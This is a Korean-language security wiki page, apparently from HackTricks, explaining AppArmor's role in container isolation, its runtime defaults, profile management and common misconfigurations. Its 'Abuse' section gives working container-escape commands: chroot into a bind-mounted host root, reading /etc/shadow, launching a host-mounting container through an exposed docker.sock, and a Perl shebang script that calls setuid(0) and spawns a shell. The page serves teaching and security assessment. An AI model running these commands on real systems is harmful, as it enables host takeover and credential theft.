# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## 개요

AppArmor는 프로그램별 프로파일을 통해 제약을 적용하는 **강제 접근 제어** 시스템입니다. 사용자 및 그룹 소유권에 크게 의존하는 기존의 DAC 검사와 달리, AppArmor는 커널이 프로세스 자체에 연결된 정책을 강제하도록 합니다. 컨테이너 환경에서는 워크로드가 기존 권한만으로는 동작을 시도할 수 있을 만큼 권한이 있어도, AppArmor 프로파일이 관련 경로, 마운트, 네트워크 동작 또는 capability 사용을 허용하지 않으면 거부될 수 있기 때문에 이것이 중요합니다.

가장 중요한 개념적 포인트는 AppArmor가 **경로 기반**이라는 점입니다. SELinux가 라벨을 통해 접근을 판단하는 것과 달리, AppArmor는 경로 규칙을 통해 파일시스템 접근을 판단합니다. 이는 접근하기 쉽고 강력하지만, bind mounts와 대체 경로 레이아웃에 주의를 기울여야 한다는 뜻이기도 합니다. 동일한 호스트 콘텐츠가 다른 경로로 접근 가능해지면, 정책의 효과가 운영자가 처음 예상한 것과 다를 수 있습니다.

## 컨테이너 격리에서의 역할

컨테이너 보안 검토는 종종 capabilities와 seccomp에서 멈추지만, 그 검사 후에도 AppArmor는 여전히 중요합니다. 컨테이너가 있어서는 안 될 권한을 더 많이 가지고 있거나 운영상 이유로 하나의 추가적인 capability가 필요한 워크로드를 상상해 보세요. AppArmor는 여전히 파일 접근, 마운트 동작, 네트워킹 및 실행 패턴을 제약하여 명백한 악용 경로를 차단할 수 있습니다. 이 때문에 애플리케이션을 "그냥 작동시키기 위해" AppArmor를 비활성화하는 것은 단순히 위험한 구성을 실제로 악용 가능한 상태로 조용히 바꿀 수 있습니다.

## 실습

호스트에서 AppArmor가 활성화되어 있는지 확인하려면 다음을 사용하세요:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
현재 container process가 어떤 권한으로 실행되고 있는지 확인하려면:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
그 차이는 설명적이다. 일반적인 경우, 프로세스는 런타임에서 선택한 프로파일에 연결된 AppArmor 컨텍스트를 보여야 한다. unconfined인 경우에는 그 추가적인 제약 레이어가 사라진다.

또한 Docker가 적용했다고 판단한 것을 확인할 수도 있다:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## 런타임 사용

Docker는 호스트가 이를 지원할 때 기본 또는 커스텀 AppArmor 프로파일을 적용할 수 있다. Podman도 AppArmor 기반 시스템에서 AppArmor와 통합할 수 있지만, SELinux 중심 배포판에서는 다른 MAC 시스템이 주로 사용된다. Kubernetes는 실제로 AppArmor를 지원하는 노드에서 워크로드 수준으로 AppArmor 정책을 노출할 수 있다. LXC 및 관련 Ubuntu 계열의 시스템 컨테이너 환경도 AppArmor를 광범위하게 사용한다.

실무적으로 중요한 점은 AppArmor가 "Docker feature"가 아니라는 것이다. 이는 여러 런타임이 적용할 수 있는 호스트-커널 기능이다. 호스트가 이를 지원하지 않거나 런타임이 unconfined로 실행되도록 설정되면, 그 예상된 보호는 실제로 존재하지 않는다.

Docker-지원 AppArmor 호스트에서 가장 잘 알려진 기본 프로파일은 `docker-default`이다. 해당 프로파일은 Moby의 AppArmor 템플릿에서 생성되며, 이것이 기본 컨테이너에서 일부 capability 기반 PoC가 여전히 실패하는 이유를 설명해주기 때문에 중요하다. 넓게 보면, `docker-default`는 일반적인 네트워킹을 허용하고, `/proc`의 많은 부분에 대한 쓰기를 거부하며, `/sys`의 민감한 부분에 대한 접근을 차단하고, 마운트 연산을 차단하며, ptrace를 제한하여 그것이 일반적인 호스트 탐색 원시 연산이 되지 않게 한다. 이러한 기본선을 이해하면 '컨테이너가 `CAP_SYS_ADMIN`을 가지고 있다'는 것과 '컨테이너가 실제로 내가 관심 있는 커널 인터페이스에 대해 그 capability를 사용할 수 있다'는 것을 구분하는 데 도움이 된다.

## 프로파일 관리

AppArmor 프로파일은 일반적으로 `/etc/apparmor.d/` 아래에 저장된다. 일반적인 명명 규칙은 실행 파일 경로의 슬래시를 점으로 바꾸는 것이다. 예를 들어 `/usr/bin/man`에 대한 프로파일은 일반적으로 `/etc/apparmor.d/usr.bin.man`으로 저장된다. 이 세부사항은 방어와 평가 모두에서 중요하다. 활성 프로파일 이름을 알게 되면 호스트에서 해당 파일을 빠르게 찾을 수 있기 때문이다.

유용한 호스트 측 관리 명령은 다음을 포함한다:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
이 명령들이 컨테이너 보안 참조에서 중요한 이유는 프로필이 실제로 어떻게 생성되고 로드되며 complain mode로 전환되고 애플리케이션 변경 이후에 어떻게 수정되는지를 설명해주기 때문입니다. 운영자가 트러블슈팅 중에 프로필을 complain mode로 옮긴 뒤 enforcement를 복원하는 것을 깜빡하는 습관이 있다면, 문서상으로는 컨테이너가 보호된 것처럼 보이지만 실제로는 훨씬 느슨하게 동작할 수 있습니다.

### 프로필 생성 및 업데이트

`aa-genprof`는 애플리케이션 동작을 관찰하여 대화형으로 프로필 생성을 도와줄 수 있습니다:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof`는 나중에 `apparmor_parser`로 로드할 수 있는 템플릿 프로파일을 생성할 수 있습니다:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
바이너리가 변경되어 정책을 업데이트해야 할 경우, `aa-logprof`는 logs에서 발견된 denials를 재생하여 운영자가 이를 허용할지 거부할지 결정하는 데 도움을 줄 수 있습니다:
```bash
sudo aa-logprof
```
### 로그

AppArmor 거부는 종종 `auditd`, syslog, 또는 `aa-notify`와 같은 도구를 통해 확인할 수 있습니다:
```bash
sudo aa-notify -s 1 -v
```
이는 운영적으로나 공격적으로 유용하다. 방어자는 이를 사용해 profiles를 다듬고, 공격자는 어떤 정확한 경로나 작업이 거부되는지 그리고 AppArmor가 exploit chain을 차단하는 제어인지 여부를 파악하는 데 사용한다.

### 정확한 profile 파일 식별

runtime가 container에 대해 특정 AppArmor profile 이름을 표시할 때, 그 이름을 디스크상의 profile 파일로 매핑하는 것이 종종 유용하다:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
이는 특히 호스트 측 검토 시 유용하다. "컨테이너가 profile `lowpriv`로 실행 중이다"라는 정보와 "실제 규칙은 감사하거나 다시 로드할 수 있는 이 특정 파일에 존재한다"는 사실 사이의 간극을 메워주기 때문이다.

## Misconfigurations

가장 명백한 실수는 `apparmor=unconfined`이다. 관리자는 프로파일이 위험하거나 예기치 않은 동작을 올바르게 차단해서 애플리케이션이 실패했을 때 디버깅을 위해 이 옵션을 설정하는 경우가 많다. 이 플래그가 프로덕션에 남아 있으면 전체 MAC 계층이 사실상 제거된다.

또 다른 미묘한 문제는 파일 권한이 정상으로 보인다는 이유로 bind mounts가 무해하다고 가정하는 것이다. AppArmor는 path-based이므로, 호스트 경로를 다른 마운트 위치에 노출하면 경로 규칙과 잘못 상호작용할 수 있다. 세 번째 실수는 구성 파일의 프로파일 이름이 호스트 커널이 실제로 AppArmor를 강제하지 않으면 거의 의미가 없다는 사실을 잊는 것이다.

## Abuse

AppArmor가 없으면 이전에 제약되었던 작업들이 갑자기 동작할 수 있다: bind mounts를 통해 민감한 경로를 읽거나, 원래 더 사용하기 어려워야 할 procfs 또는 sysfs의 일부에 접근하거나, capabilities/seccomp가 허용하면 마운트 관련 동작을 수행하거나, 프로파일이 보통 거부했을 경로를 사용하는 등의 경우다. AppArmor는 capability 기반 breakout 시도가 이론상으로는 "작동해야 한다"고 보이지만 실제로는 실패하는 이유를 설명해 주는 메커니즘인 경우가 많다. AppArmor를 제거하면 같은 시도가 성공하기 시작할 수 있다.

AppArmor가 path-traversal, bind-mount, 또는 mount-based 악용 체인을 막는 주요 원인이라고 의심된다면, 첫 단계는 보통 프로파일이 있을 때와 없을 때 어떤 것이 접근 가능한지 비교하는 것이다. 예를 들어 호스트 경로가 컨테이너 내부에 마운트되어 있다면, 먼저 해당 경로를 순회하고 읽을 수 있는지 확인해보라:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
컨테이너에 `CAP_SYS_ADMIN` 같은 위험한 권한이 있는 경우, 가장 실용적인 테스트 중 하나는 AppArmor가 마운트 작업 또는 민감한 커널 파일시스템에 대한 접근을 차단하는 제어인지 여부를 확인하는 것입니다:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
호스트 경로가 이미 bind mount를 통해 사용 가능한 환경에서는, AppArmor를 잃으면 읽기 전용 정보 노출 문제가 호스트 파일에 대한 직접 접근으로 바뀔 수도 있습니다:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
이 명령들의 요점은 AppArmor만으로 breakout을 만든다는 것이 아니다. AppArmor가 제거되면 많은 filesystem 및 mount 기반의 abuse paths가 즉시 테스트 가능해진다는 것이다.

### 전체 예시: AppArmor 비활성화 + 호스트 루트 마운트됨

컨테이너에 이미 호스트 루트가 `/host`에 bind-mounted 되어 있다면, AppArmor를 제거함으로써 차단된 filesystem abuse path가 완전한 host escape로 바뀔 수 있다:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
한 번 shell이 host filesystem을 통해 실행되기 시작하면, 워크로드는 사실상 container 경계를 벗어난 것입니다:
```bash
id
hostname
cat /etc/shadow | head
```
### 전체 예제: AppArmor Disabled + Runtime Socket

실제 장벽이 runtime 상태를 둘러싼 AppArmor였다면, 마운트된 socket만으로 완전한 탈출이 가능할 수 있습니다:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
정확한 경로는 마운트 포인트에 따라 다르지만, 최종 결과는 동일합니다: AppArmor는 더 이상 runtime API에 대한 접근을 차단하지 않으며, runtime API는 호스트를 침해할 수 있는 컨테이너를 실행할 수 있습니다.

### 전체 예제: Path-Based Bind-Mount Bypass

AppArmor는 경로 기반이기 때문에, `/proc/**`를 보호한다고 해서 동일한 호스트 procfs 콘텐츠가 다른 경로를 통해 접근 가능할 때 자동으로 보호되지는 않습니다:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
영향은 정확히 어떤 것이 마운트되어 있고 대체 경로가 다른 제어도 우회하는지에 따라 달라지지만, 이 패턴은 AppArmor는 개별적으로 평가할 것이 아니라 마운트 레이아웃과 함께 평가해야 하는 가장 분명한 이유 중 하나이다.

### 전체 예제: Shebang Bypass

AppArmor 정책은 때때로 인터프리터 경로를 대상으로 삼는데, shebang 처리로 인한 스크립트 실행을 완전히 고려하지 않는 방식으로 설정되는 경우가 있다. 과거의 예로는 첫 줄이 제한된 인터프리터를 가리키는 스크립트를 사용하는 경우가 있었다:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
이런 유형의 예시는 profile 의도와 실제 실행 의미론이 달라질 수 있다는 점을 상기시키는 데 중요합니다. container 환경에서 AppArmor를 검토할 때, interpreter chains와 대체 실행 경로에 특별한 주의를 기울여야 합니다.

## Checks

이 검사들의 목적은 세 가지 질문에 빠르게 답하는 것입니다: 호스트에서 AppArmor가 활성화되어 있는가, 현재 process가 격리되어 있는가, 그리고 runtime이 실제로 이 container에 profile을 적용했는가?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
무엇이 흥미로운가:

- 만약 `/proc/self/attr/current`가 `unconfined`를 표시하면, 워크로드는 AppArmor 격리의 혜택을 받지 못합니다.
- 만약 `aa-status`가 AppArmor가 비활성화되었거나 로드되지 않았음을 표시하면, 런타임 구성의 프로파일 이름은 대부분 장식에 불과합니다.
- 만약 `docker inspect`가 `unconfined` 또는 예상치 못한 커스텀 프로파일을 표시하면, 이는 종종 파일시스템 또는 마운트 기반 악용 경로가 작동하는 이유입니다.

운영상의 이유로 컨테이너가 이미 권한 상승된 상태라면, AppArmor를 활성화한 채로 두는 것이 통제된 예외와 훨씬 더 광범위한 보안 실패를 가르는 차이를 만드는 경우가 많습니다.

## 런타임 기본값

| Runtime / platform | 기본 상태 | 기본 동작 | 일반적인 수동 약화 방법 |
| --- | --- | --- | --- |
| Docker Engine | AppArmor를 지원하는 호스트에서 기본적으로 활성화됨 | 오버라이드되지 않는 한 `docker-default` AppArmor 프로파일을 사용함 | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | 호스트에 따라 다름 | `--security-opt`을 통해 AppArmor를 지원하지만, 정확한 기본값은 호스트/런타임에 따라 다르며 Docker의 문서화된 `docker-default` 프로파일만큼 보편적이지 않음 | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | 조건부 기본값 | `appArmorProfile.type`가 지정되지 않으면 기본값은 `RuntimeDefault`이지만, 이는 노드에서 AppArmor가 활성화된 경우에만 적용됨 | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost`(약한 프로파일 사용), AppArmor 미지원 노드 |
| containerd / CRI-O under Kubernetes | 노드/런타임 지원을 따름 | 일반적인 Kubernetes 지원 런타임은 AppArmor를 지원하지만, 실제 강제 적용은 여전히 노드 지원과 워크로드 설정에 따라 달림 | Kubernetes 행과 동일; 직접 런타임 구성으로 AppArmor를 완전히 생략할 수도 있음 |

AppArmor에서는 가장 중요한 변수는 종종 런타임뿐만 아니라 **호스트**입니다. 매니페스트의 프로파일 설정은 AppArmor가 활성화되지 않은 노드에서는 격리를 생성하지 않습니다.
